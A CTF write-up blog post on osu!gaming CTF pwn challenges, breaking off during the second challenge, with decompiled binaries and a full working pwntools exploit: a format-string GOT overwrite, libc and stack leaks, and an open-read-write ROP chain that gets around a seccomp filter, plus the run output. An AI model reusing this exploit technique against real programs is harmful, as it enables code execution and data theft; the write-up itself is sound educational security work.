@@ -1,0 +1,1207 @@
+---
+title: 'osu!gamingctf pwn'
+description: 'format string, OOB R/W'
+date: 2025-10-26
+tags: ['pwn', 'ctf']
+image: './osuctf.png'
+authors: ['jp']
+---
+
+# Background Information
+
+Yoooo, back with another ctf writeup! I played osu!gaming ctf with CMU's ctf team PPP (17th place) and this ctf I felt pretty satisfied with my learning and contribution as I was able to solve some web and solve all the pwn (with help of course). Overall really fun break from the usual homework and studying grind! 
+
+## miss-analyzer-v2
+
+> miss-analyzer from last year was a bit buggy :((
+> 
+> I changed some things to make it more secure, surely it's fine now, right?
+
+First off, let's just get a basic overview of what the code does, and find any vulnerabilities. 
+
+```c
+
+undefined8 hexchr2bin(char param_1,char *param_2)
+
+{
+  undefined8 uVar1;
+  
+  if (param_2 == (char *)0x0) {
+    uVar1 = 0;
+  }
+  else {
+    if ((param_1 < '0') || ('9' < param_1)) {
+      if ((param_1 < 'A') || ('F' < param_1)) {
+        if ((param_1 < 'a') || ('f' < param_1)) {
+          return 0;
+        }
+        *param_2 = param_1 + -0x57;
+      }
+      else {
+        *param_2 = param_1 + -0x37;
+      }
+    }
+    else {
+      *param_2 = param_1 + -0x30;
+    }
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+
+ulong hexs2bin(char *param_1,long *param_2)
+
+{
+  int iVar1;
+  void *pvVar2;
+  ulong uVar3;
+  long in_FS_OFFSET;
+  char local_22;
+  byte local_21;
+  ulong local_20;
+  size_t local_18;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  if (((param_1 == (char *)0x0) || (*param_1 == '\0')) || (param_2 == (long *)0x0)) {
+    uVar3 = 0;
+  }
+  else {
+    local_18 = strlen(param_1);
+    if ((local_18 & 1) == 0) {
+      local_18 = local_18 >> 1;
+      pvVar2 = malloc(local_18);
+      *param_2 = (long)pvVar2;
+      memset((void *)*param_2,0x41,local_18);
+      for (local_20 = 0; uVar3 = local_18, local_20 < local_18; local_20 = local_20 + 1) {
+        iVar1 = hexchr2bin((int)param_1[local_20 * 2],&local_22);
+        if ((iVar1 == 0) ||
+           (iVar1 = hexchr2bin((int)param_1[local_20 * 2 + 1],&local_21), iVar1 == 0)) {
+          uVar3 = 0;
+          break;
+        }
+        *(byte *)(local_20 + *param_2) = (byte)((int)local_22 << 4) | local_21;
+      }
+    }
+    else {
+      uVar3 = 0;
+    }
+  }
+  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
+    return uVar3;
+  }
+                    // WARNING: Subroutine does not return
+  __stack_chk_fail();
+}
+
+undefined1 read_byte(long *param_1,long *param_2)
+
+{
+  undefined1 uVar1;
+  
+  if (*param_2 == 0) {
+    puts("Error: failed to read replay");
+    FUN_00401220(1);
+  }
+  uVar1 = *(undefined1 *)*param_1;
+  *param_1 = *param_1 + 1;
+  *param_2 = *param_2 + -1;
+  return uVar1;
+}
+
+int read_short(undefined8 param_1,undefined8 param_2)
+
+{
+  char cVar1;
+  char cVar2;
+  
+  cVar1 = read_byte(param_1,param_2);
+  cVar2 = read_byte(param_1,param_2);
+  return (int)((double)(int)(short)cVar1 + (double)(int)(short)cVar2 * 256.0);
+}
+
+void read_string(undefined8 param_1,undefined8 param_2,undefined1 *param_3,uint param_4)
+
+{
+  uint uVar1;
+  byte bVar2;
+  char cVar3;
+  undefined1 uVar4;
+  uint local_24;
+  uint local_1c;
+  
+  *param_3 = 0;
+  cVar3 = read_byte(param_1,param_2);
+  if (cVar3 != '\0') {
+    if (cVar3 != '\v') {
+      puts("Error: failed to read string");
+      FUN_00401220(1);
+    }
+    local_24 = 0;
+    bVar2 = 0;
+    while( true ) {
+      cVar3 = read_byte(param_1,param_2);
+      local_24 = local_24 | ((int)cVar3 & 0x7fU) << (bVar2 & 0x1f);
+      if (-1 < cVar3) break;
+      bVar2 = bVar2 + 7;
+    }
+    local_1c = 0;
+    while( true ) {
+      uVar1 = param_4;
+      if (local_24 < param_4) {
+        uVar1 = local_24;
+      }
+      if (uVar1 <= local_1c) break;
+      uVar4 = read_byte(param_1,param_2);
+      param_3[(int)local_1c] = uVar4;
+      local_1c = local_1c + 1;
+    }
+    for (; local_1c < local_24; local_1c = local_1c + 1) {
+      read_byte(param_1,param_2);
+    }
+    if (param_4 <= local_24) {
+      local_24 = param_4;
+    }
+    param_3[local_24] = 0;
+  }
+  return;
+}
+
+void consume_bytes(undefined8 param_1,undefined8 param_2,int param_3)
+
+{
+  undefined4 local_c;
+  
+  for (local_c = 0; local_c < param_3; local_c = local_c + 1) {
+    read_byte(param_1,param_2);
+  }
+  return;
+}
+
+undefined8
+main(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
+    undefined8 param_6)
+
+{
+  char *pcVar1;
+  char cVar2;
+  short sVar3;
+  int iVar4;
+  undefined8 uVar5;
+  __ssize_t _Var6;
+  size_t sVar7;
+  long in_FS_OFFSET;
+  char *local_158;
+  size_t local_150;
+  void *local_148;
+  long local_140;
+  void *local_138;
+  long local_130;
+  char local_128 [264];
+  long local_20;
+  
+  local_20 = *(long *)(in_FS_OFFSET + 0x28);
+  setvbuf(stdin,(char *)0x0,2,0);
+  setvbuf(stdout,(char *)0x0,2,0);
+  local_130 = seccomp_init(0x7fff0000);
+  if (local_130 == 0) {
+    puts("Error: failed to initialize seccomp");
+    uVar5 = 1;
+  }
+  else {
+    iVar4 = seccomp_rule_add(local_130,0,0x3b,0,param_5,param_6,param_2);
+    if (iVar4 < 0) {
+      puts("Error: failed to add seccomp rule");
+      seccomp_release(local_130);
+      uVar5 = 1;
+    }
+    else {
+      iVar4 = seccomp_rule_add(local_130,0,0x142,0,param_5,param_6,param_2);
+      if (iVar4 < 0) {
+        puts("Error: failed to add seccomp rule");
+        seccomp_release(local_130);
+        uVar5 = 1;
+      }
+      else {
+        iVar4 = seccomp_load(local_130);
+        if (iVar4 < 0) {
+          puts("Error: failed to load seccomp filter");
+          seccomp_release(local_130);
+          uVar5 = 1;
+        }
+        else {
+          puts("Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):");
+          local_158 = (char *)0x0;
+          local_150 = 0;
+          _Var6 = getline(&local_158,&local_150,stdin);
+          pcVar1 = local_158;
+          if (_Var6 < 1) {
+            uVar5 = 1;
+          }
+          else {
+            sVar7 = strcspn(local_158,"\n");
+            pcVar1[sVar7] = '\0';
+            if (*local_158 == '\0') {
+              uVar5 = 1;
+            }
+            else {
+              local_140 = hexs2bin(local_158,&local_148);
+              local_138 = local_148;
+              if (local_140 == 0) {
+                puts("Error: failed to decode hex");
+                uVar5 = 1;
+              }
+              else {
+                puts("\n=~= miss-analyzer =~=");
+                cVar2 = read_byte(&local_138,&local_140);
+                if (cVar2 == '\0') {
+                  puts("Mode: osu!");
+                }
+                else if (cVar2 == '\x01') {
+                  puts("Mode: osu!taiko");
+                }
+                else if (cVar2 == '\x02') {
+                  puts("Mode: osu!catch");
+                }
+                else if (cVar2 == '\x03') {
+                  puts("Mode: osu!mania");
+                }
+                consume_bytes(&local_138,&local_140,4);
+                read_string(&local_138,&local_140,local_128,0xff);
+                printf("Hash: %s\n",local_128);
+                read_string(&local_138,&local_140,local_128,0xff);
+                printf("Player name: ");
+                printf(local_128);
+                putchar(10);
+                read_string(&local_138,&local_140,local_128,0xff);
+                consume_bytes(&local_138,&local_140,10);
+                sVar3 = read_short(&local_138,&local_140);
+                printf("Miss count: %d\n",(ulong)(uint)(int)sVar3);
+                if (sVar3 == 0) {
+                  puts("You didn\'t miss!");
+                }
+                else {
+                  puts("Yep, looks like you missed.");
+                }
+                puts("=~=~=~=~=~=~=~=~=~=~=\n");
+                free(local_158);
+                free(local_148);
+                seccomp_release(local_130);
+                uVar5 = 0;
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    // WARNING: Subroutine does not return
+    __stack_chk_fail();
+  }
+  return uVar5;
+}
+```
+
+what this code does is it takes in a hexstring, and extracts metadata from it, which is mode, hash, player name, and miss count and outputs it to us.
+
+Ok there is a printf vulnerability in `main` for player name since the format specifier is missing. However, this only gives us one invocation of printf, which is pretty useless. Let's check protections:
+
+There is also a seccomp applied which is:
+
+```bash
+line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
+ 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
+ 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+This means every syscall except `execve` and `execveat` is allowed, which basically means our ROP chain will have to be way more complicated as we can't just get shell, so we will do an OPEN, READ, WRITE syscall rop chain to read open flag.txt, read it, then output it to stdout.
+
+```bash
+pwndbg> checksec
+File:     /home/jake/osugaming/pwn_miss-analyzer-v2/dist/analyzer
+Arch:     amd64
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+```
+
+Oh wow! Partial relro, which means GOT is writeable. No PIE, so that might also make life easier for us. So we know that GOT is writeable, we can overwrite a function in GOT with `main` that is used by `main` after the format string such that we basically have an infinite loop and hopefully infinite printfs!
+
+I specifically targeted `free` in GOT. And we can see that the `free` is successfully overwritten:
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+# Set the log level to debug to see all the I/O
+context.log_level = 'info' # Change to 'debug' for more verbosity
+context.arch = 'amd64'
+
+elf = ELF('./analyzer_patched')
+libc = ELF('./libc.so.6')
+
+if 'REMOTE' in args:
+    r = remote('miss-analyzer-v2.challs.sekai.team', 1337)
+else:
+    r = process(elf.path)
+
+gdb.attach(r, """
+b *main+1185
+continue
+""")
+
+
+printf_got = elf.got['printf']
+free = elf.got['free']
+
+def write_byte(value):
+    return struct.pack('B', value)
+
+def write_int(value):
+    return struct.pack('<I', value)
+
+def write_short(value):
+    return struct.pack('<H', value)
+
+def write_string(s):
+    """Write osu! replay string format"""
+    result = b''
+    
+    if not s:
+        result += b'\x00'
+    else:
+        result += b'\x0b'  # String indicator
+        
+        # Convert string to bytes if needed
+        if isinstance(s, str):
+            s = s.encode()
+        elif not isinstance(s, bytes):
+            s = bytes(s)
+        
+        # Write variable-length integer for string length
+        length = len(s)
+        while length >= 0x80:
+            result += bytes([(length & 0x7f) | 0x80])
+            length >>= 7
+        result += bytes([length & 0x7f])
+        
+        # Write the actual string
+        result += s
+    
+    return result
+
+def build_payload(payload):
+    replay = b''  
+    # Game mode (1 byte) - 0 = osu!
+    replay += write_byte(0)
+    # Version (4 bytes)
+    replay += write_int(20)
+    # Beatmap hash (string)
+    replay += write_string('a'*19)
+    # Player name (string) - THIS IS WHERE OUR PAYLOAD GOES
+    replay += write_string(payload)
+    # Replay hash (string)
+    replay += write_string('b' * 2)
+    # Score statistics (10 bytes)
+    replay += write_short(0)  # 300s
+    replay += write_short(0)  # 100s
+    replay += write_short(0)  # 50s
+    replay += write_short(0)  # Gekis
+    replay += write_short(0)  # Katus
+    # Miss count (2 bytes)
+    replay += write_short(5)
+    return replay
+
+
+write_offset = 16
+
+# overwrite
+hex_payload = build_payload(fmtstr_payload(write_offset, {free: elf.symbols['main']})).hex().encode()
+
+r.sendline(hex_payload)
+
+r.recvuntil(b"\nMiss")
+r.interactive()
+```
+
+```bash
+pwndbg> got
+Filtering out read-only entries (display them with -r or --show-readonly)
+
+State of the GOT of /home/jake/osugaming/pwn_miss-analyzer-v2/dist/analyzer_patched:
+GOT protection: Partial RELRO | Found 16 GOT entries passing the filter
+[0x404018] free@GLIBC_2.2.5 -> 0x401749 (main) ◂— endbr64
+[0x404020] seccomp_init -> 0x7a1f0f83d760 (seccomp_init) ◂— endbr64
+[0x404028] putchar@GLIBC_2.2.5 -> 0x7a1f0f682980 ◂— endbr64
+[0x404030] seccomp_rule_add -> 0x7a1f0f83eab0 (seccomp_rule_add) ◂— endbr64
+[0x404038] puts@GLIBC_2.2.5 -> 0x7a1f0f680e50 ◂— endbr64
+[0x404040] seccomp_load -> 0x7a1f0f83df40 (seccomp_load) ◂— endbr64
+[0x404048] strlen@GLIBC_2.2.5 -> 0x7a1f0f79d860 ◂— endbr64
+[0x404050] __stack_chk_fail@GLIBC_2.4 -> 0x4010a0 ◂— endbr64
+[0x404058] printf@GLIBC_2.2.5 -> 0x7a1f0f6606f0 ◂— endbr64
+[0x404060] seccomp_release -> 0x4010c0 ◂— endbr64
+[0x404068] memset@GLIBC_2.2.5 -> 0x7a1f0f7a1000 ◂— endbr64
+[0x404070] strcspn@GLIBC_2.2.5 -> 0x7a1f0f798610 ◂— endbr64
+[0x404078] malloc@GLIBC_2.2.5 -> 0x7a1f0f6a50a0 ◂— endbr64
+[0x404080] setvbuf@GLIBC_2.2.5 -> 0x7a1f0f6815f0 ◂— endbr64
+[0x404088] getline@GLIBC_2.2.5 -> 0x7a1f0f661db0 ◂— endbr64
+[0x404090] exit@GLIBC_2.2.5 -> 0x401120 ◂— endbr64
+```
+
+Amazing! Ok so now that we have basically an infinite loop of printfs, we can start an initial leak off the stack to get libc and stack leak for rip control then do format string writes to overwrite RIP with a rop chain from rop gadgets from LIBC which we can get from the libc leak! 
+
+For our ORW rop chain, we will have to write flag.txt to BSS since we need the string "flag.txt" to open the flag in our rop chain, which is trivial since we have format string writes, and we can automate the format string writes with pwntools moving forward
+
+```python
+# Stage 3: Write "./flag.txt" string to BSS
+bss_addr = elf.bss(0x800)  # Get a writable BSS address with offset
+flag_str = bss_addr + 0x100
+read_buf = bss_addr + 0x200
+
+log.info(f"BSS @ {hex(bss_addr)}")
+log.info(f"Flag string @ {hex(flag_str)}")
+log.info(f"Read buffer @ {hex(read_buf)}")
+
+# Write "./flag.txt\x00" (11 bytes total)
+flag_filename = b"./flag.txt\x00"
+writes_flag = {
+    flag_str: u64(flag_filename[0:8]),      # "./flag.t"
+    flag_str + 8: u64(flag_filename[8:].ljust(8, b'\x00'))  # "xt\x00"
+}
+
+payload = fmtstr_payload(write_offset, writes=writes_flag, write_size='short')
+log.info(f"Stage 3: Writing filename (payload size: {len(payload)} bytes)")
+hex_payload = build_payload(payload).hex().encode()
+r.sendline(hex_payload)
+r.recvuntil(b"\nMiss")
+```
+
+```bash
+pwndbg> telescope 0x4049b0
+00:0000│     0x4049b0 ◂— './flag.txt'
+01:0008│     0x4049b8 ◂— 0x7478 /* 'xt' */
+02:0010│     0x4049c0 ◂— 0
+```
+
+Awesome! We were able to write to flag.txt! Now all that is left is to control RIP with our rop chain! I found the saved rip to be +8088 away from the leaked stack address with gdb. You can probably do the same with `info frame` in gdb once you break at `main+1185`.
+
+Let's build a general ORW ROP chain and write it in smaller chunks so that it won't crash (I found that out the very time-wasting long way). We also might have to press `enter` a lot so that main will ret...
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+# Set the log level to debug to see all the I/O
+context.log_level = 'info' # Change to 'debug' for more verbosity
+context.arch = 'amd64'
+
+elf = ELF('./analyzer_patched')
+libc = ELF('./libc.so.6')
+
+if 'REMOTE' in args:
+    r = remote('miss-analyzer-v2.challs.sekai.team', 1337)
+else:
+    r = process(elf.path)
+
+# gdb.attach(r, """
+# b *main+1185
+# continue
+# """)
+
+
+printf_got = elf.got['printf']
+free = elf.got['free']
+
+def write_byte(value):
+    return struct.pack('B', value)
+
+def write_int(value):
+    return struct.pack('<I', value)
+
+def write_short(value):
+    return struct.pack('<H', value)
+
+def write_string(s):
+    """Write osu! replay string format"""
+    result = b''
+    
+    if not s:
+        result += b'\x00'
+    else:
+        result += b'\x0b'  # String indicator
+        
+        # Convert string to bytes if needed
+        if isinstance(s, str):
+            s = s.encode()
+        elif not isinstance(s, bytes):
+            s = bytes(s)
+        
+        # Write variable-length integer for string length
+        length = len(s)
+        while length >= 0x80:
+            result += bytes([(length & 0x7f) | 0x80])
+            length >>= 7
+        result += bytes([length & 0x7f])
+        
+        # Write the actual string
+        result += s
+    
+    return result
+
+def build_payload(payload):
+    replay = b''  
+    # Game mode (1 byte) - 0 = osu!
+    replay += write_byte(0)
+    # Version (4 bytes)
+    replay += write_int(20)
+    # Beatmap hash (string)
+    replay += write_string('a'*19)
+    # Player name (string) - THIS IS WHERE OUR PAYLOAD GOES
+    replay += write_string(payload)
+    # Replay hash (string)
+    replay += write_string('b' * 2)
+    # Score statistics (10 bytes)
+    replay += write_short(0)  # 300s
+    replay += write_short(0)  # 100s
+    replay += write_short(0)  # 50s
+    replay += write_short(0)  # Gekis
+    replay += write_short(0)  # Katus
+    # Miss count (2 bytes)
+    replay += write_short(5)
+    return replay
+
+
+write_offset = 16
+
+# overwrite
+hex_payload = build_payload(fmtstr_payload(write_offset, {free: elf.symbols['main']})).hex().encode()
+
+r.sendline(hex_payload)
+
+r.recvuntil(b"\nMiss")
+
+hex_payload = build_payload("%p."*30).hex().encode()
+
+r.sendline(hex_payload)
+#bullshit here
+r.recvuntil("Player name: ")
+leaks = r.recvuntil(b"\nMiss").split(b".")
+print(leaks)
+
+libc_leak = int(leaks[2], 16) - 1132791
+libc.address = libc_leak
+
+stack_leak = int(leaks[0], 16) 
+
+log.info("libc base @ " + hex(libc_leak))
+log.info("stack leak @ " + hex(stack_leak))
+
+
+log.info("rip leak @ " + hex(stack_leak + 8088))
+saved_rip_addr = stack_leak + 8088
+
+# Get ROP gadgets
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
+pop_rdx_rbx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
+pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
+syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+log.success(f"pop rdi; ret @ {hex(pop_rdi)}")
+log.success(f"pop rsi; ret @ {hex(pop_rsi)}")
+log.success(f"pop rdx; pop rbx; ret @ {hex(pop_rdx_rbx)}")
+log.success(f"pop rax; ret @ {hex(pop_rax)}")
+log.success(f"syscall; ret @ {hex(syscall_ret)}")
+
+# Stage 3: Write "./flag.txt" string to BSS
+bss_addr = elf.bss(0x800)  # Get a writable BSS address with offset
+flag_str = bss_addr + 0x100
+read_buf = bss_addr + 0x200
+
+log.info(f"BSS @ {hex(bss_addr)}")
+log.info(f"Flag string @ {hex(flag_str)}")
+log.info(f"Read buffer @ {hex(read_buf)}")
+
+# Write "./flag.txt\x00" (11 bytes total)
+flag_filename = b"./flag.txt\x00"
+writes_flag = {
+    flag_str: u64(flag_filename[0:8]),      # "./flag.t"
+    flag_str + 8: u64(flag_filename[8:].ljust(8, b'\x00'))  # "xt\x00"
+}
+
+payload = fmtstr_payload(write_offset, writes=writes_flag, write_size='short')
+log.info(f"Stage 3: Writing filename (payload size: {len(payload)} bytes)")
+hex_payload = build_payload(payload).hex().encode()
+r.sendline(hex_payload)
+r.recvuntil(b"\nMiss")
+
+# Stage 4: Write ORW ROP chain to stack in CHUNKS
+log.info("Stage 4: Writing ORW ROP chain in chunks...")
+
+rop_chain = [
+    # open("./flag.txt", O_RDONLY, 0)
+    pop_rdi, flag_str,
+    pop_rsi, 0,  # O_RDONLY
+    pop_rdx_rbx, 0, 0,
+    pop_rax, 2,  # SYS_open
+    syscall_ret,
+
+    # read(fd=3, buf=read_buf, count=0x100)
+    pop_rdi, 3,  # fd (usually 3)
+    pop_rsi, read_buf,
+    pop_rdx_rbx, 0x100, 0,
+    pop_rax, 0,  # SYS_read
+    syscall_ret,
+
+    # write(stdout=1, buf=read_buf, count=0x100)
+    pop_rdi, 1,  # stdout
+    pop_rsi, read_buf,
+    pop_rdx_rbx, 0x100, 0,
+    pop_rax, 1,  # SYS_write
+    syscall_ret,
+]
+
+log.info(f"ROP chain has {len(rop_chain)} gadgets")
+
+# Write ROP chain in chunks to avoid massive format strings
+CHUNK_SIZE = 3  # Write 3 gadgets at a time
+for chunk_idx in range(0, len(rop_chain), CHUNK_SIZE):
+    chunk = rop_chain[chunk_idx:chunk_idx + CHUNK_SIZE]
+    writes = {}
+
+    for i, gadget in enumerate(chunk):
+        target_addr = saved_rip_addr + (chunk_idx + i) * 8
+        writes[target_addr] = gadget
+
+    payload = fmtstr_payload(write_offset, writes=writes, write_size='short')
+    log.info(f"Writing chunk {chunk_idx//CHUNK_SIZE + 1} (payload: {len(payload)} bytes)")
+
+    hex_payload = build_payload(payload).hex().encode()
+    r.sendline(hex_payload)
+    r.recvuntil(b"\nMiss")
+
+log.success("ROP chain written! Triggering by exiting loop...")
+
+# Send one more to trigger return
+r.sendline(build_payload(b"TRIGGER").hex().encode())
+r.interactive()
+```
+
+And... we get flag!
+
+```bash
+[+] Opening connection to miss-analyzer-v2.challs.sekai.team on port 1337: Done
+/home/jake/osugaming/pwn_miss-analyzer-v2/dist/solve.py:97: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.recvuntil("Player name: ")
+[b'0x7ffd1eebdda0', b'(nil)', b'0x7ccde899c8f7', b'0xd', b'0x7fffffff', b'0x1', b'0x2adc148000000000', b'(nil)', b'(nil)', b'0x2adc2180', b'0x1e0', b'0x2adc2370', b'0x10', b'0x2adc23e6', b'0x2adc1580', b'0x70252e70252e7025', b'0x252e70252e70252e', b'0x2e70252e70252e70', b'0x70252e70252e7025', b'0x252e70252e70252e', b'0x2e70252e70252e70', b'0x70252e70252e7025', b'0x252e70252e70252e', b'0x2e70252e70252e70', b'0x70252e70252e7025', b'0x252e70252e70252e', b'0x7ccde8002e70', b'0x7ffd1eebff80', b'0x7ccde8aa3780', b'0x1', b'\nMiss']
+[*] libc base @ 0x7ccde8888000
+[*] stack leak @ 0x7ffd1eebdda0
+[*] rip leak @ 0x7ffd1eebfd38
+[*] Loaded 219 cached gadgets for './libc.so.6'
+[+] pop rdi; ret @ 0x7ccde88b23e5
+[+] pop rsi; ret @ 0x7ccde88b3e51
+[+] pop rdx; pop rbx; ret @ 0x7ccde89184a9
+[+] pop rax; ret @ 0x7ccde88cdeb0
+[+] syscall; ret @ 0x7ccde8919316
+[*] BSS @ 0x4048b0
+[*] Flag string @ 0x4049b0
+[*] Read buffer @ 0x404ab0
+[*] Stage 3: Writing filename (payload size: 120 bytes)
+[*] Stage 4: Writing ORW ROP chain in chunks...
+[*] ROP chain has 30 gadgets
+[*] Writing chunk 1 (payload: 160 bytes)
+[*] Writing chunk 2 (payload: 96 bytes)
+[*] Writing chunk 3 (payload: 96 bytes)
+[*] Writing chunk 4 (payload: 144 bytes)
+[*] Writing chunk 5 (payload: 168 bytes)
+[*] Writing chunk 6 (payload: 104 bytes)
+[*] Writing chunk 7 (payload: 144 bytes)
+[*] Writing chunk 8 (payload: 128 bytes)
+[*] Writing chunk 9 (payload: 104 bytes)
+[*] Writing chunk 10 (payload: 136 bytes)
+[+] ROP chain written! Triggering by exiting loop...
+[*] Switching to interactive mode
+ count: 5
+Yep, looks like you missed.
+=~=~=~=~=~=~=~=~=~=~=
+
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+
+=~= miss-analyzer =~=
+Mode: osu!
+Hash: aaaaaaaaaaaaaaaaaaa
+Player name: TRIGGER
+Miss count: 5
+Yep, looks like you missed.
+=~=~=~=~=~=~=~=~=~=~=
+
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+$ 
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
+$ 
+osu{fmtstr_in_the_b1g_2025}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
+```
+
+Flag: `osu{fmtstr_in_the_b1g_2025}`
+
+## imagemap-generator
+
+> making imagemaps is too hard...
+> 
+> so i built a program to make it easier!
+
+Worked on this chall with the goat @i3. He figured out how to arb write, so I probably won't be as in depth as him since I wasn't the one really doing that and I forgot his explanation lol. Ok let's look at what the source code is doing and if there are any vulnerabilities:
+
+```c
+int __fastcall create_area(__int64 a1, int *a2)
+{
+  char src[1024]; // [rsp+10h] [rbp-820h] BYREF
+  char s[1024]; // [rsp+410h] [rbp-420h] BYREF
+  __int64 v5; // [rsp+810h] [rbp-20h] BYREF
+  __int64 v6; // [rsp+818h] [rbp-18h] BYREF
+  __int64 v7; // [rsp+820h] [rbp-10h] BYREF
+  __int64 v8; // [rsp+828h] [rbp-8h] BYREF
+
+  printf("Enter the x coordinate: ");
+  __isoc99_scanf("%ld", &v8);
+  printf("Enter the y coordinate: ");
+  __isoc99_scanf("%ld", &v7);
+  printf("Enter the width: ");
+  __isoc99_scanf("%ld", &v6);
+  printf("Enter the height: ");
+  __isoc99_scanf("%ld", &v5);
+  getchar();
+  printf("Enter the redirect URL: ");
+  fgets(s, 1024, stdin);
+  s[strcspn(s, "\n")] = 0;
+  printf("Enter the title: ");
+  fgets(src, 1024, stdin);
+  src[strcspn(src, "\n")] = 0;
+  if ( *a2 > 15 )
+    return printf("Maximum number of areas (%d) reached!\n", 16);
+  *(_QWORD *)(a1 + 544LL * *a2) = v8;
+  *(_QWORD *)(a1 + 544LL * *a2 + 8) = v7;
+  *(_QWORD *)(a1 + 544LL * *a2 + 16) = v6;
+  *(_QWORD *)(a1 + 544LL * *a2 + 24) = v5;
+  strcpy((char *)(544LL * *a2 + a1 + 32), s);
+  strcpy((char *)(544LL * *a2 + a1 + 288), src);
+  return printf("Area created successfully! Total areas: %d\n", ++*a2);
+}
+// 401120: using guessed type __int64 __isoc99_scanf(const char *, ...);
+
+//----- (000000000040152E) ----------------------------------------------------
+int __fastcall remove_area(__int64 a1, _DWORD *a2)
+{
+  int v3; // [rsp+14h] [rbp-Ch] BYREF
+  int j; // [rsp+18h] [rbp-8h]
+  int i; // [rsp+1Ch] [rbp-4h]
+
+  if ( !*a2 )
+    return puts("No areas to remove.");
+  puts("Current areas:");
+  for ( i = 0; i < *a2; ++i )
+    printf(
+      "  %d. [%ld,%ld %ldx%ld] %s - %s\n",
+      i + 1,
+      *(_QWORD *)(544LL * i + a1),
+      *(_QWORD *)(544LL * i + a1 + 8),
+      *(_QWORD *)(544LL * i + a1 + 16),
+      *(_QWORD *)(544LL * i + a1 + 24),
+      (const char *)(544LL * i + a1 + 32),
+      (const char *)(544LL * i + a1 + 288));
+  printf("Enter area number to remove (1-%d): ", *a2);
+  __isoc99_scanf("%d", &v3);
+  getchar();
+  for ( j = v3 - 1; j < *a2 - 1; ++j )
+    qmemcpy((void *)(544LL * j + a1), (const void *)(544 * (j + 1LL) + a1), 0x220u);
+  return printf("Area removed successfully! Total areas: %d\n", --*a2);
+}
+// 401120: using guessed type __int64 __isoc99_scanf(const char *, ...);
+
+//----- (0000000000401760) ----------------------------------------------------
+int __fastcall edit_area(__int64 a1, _DWORD *a2)
+{
+  __int64 v3; // rbx
+  __int64 v4; // rbx
+  int v5; // [rsp+18h] [rbp-18h] BYREF
+  int i; // [rsp+1Ch] [rbp-14h]
+
+  if ( !*a2 )
+    return puts("No areas to edit.");
+  puts("Current areas:");
+  for ( i = 0; i < *a2; ++i )
+    printf(
+      "  %d. [%ld,%ld %ldx%ld] %s - %s\n",
+      i + 1,
+      *(_QWORD *)(544LL * i + a1),
+      *(_QWORD *)(544LL * i + a1 + 8),
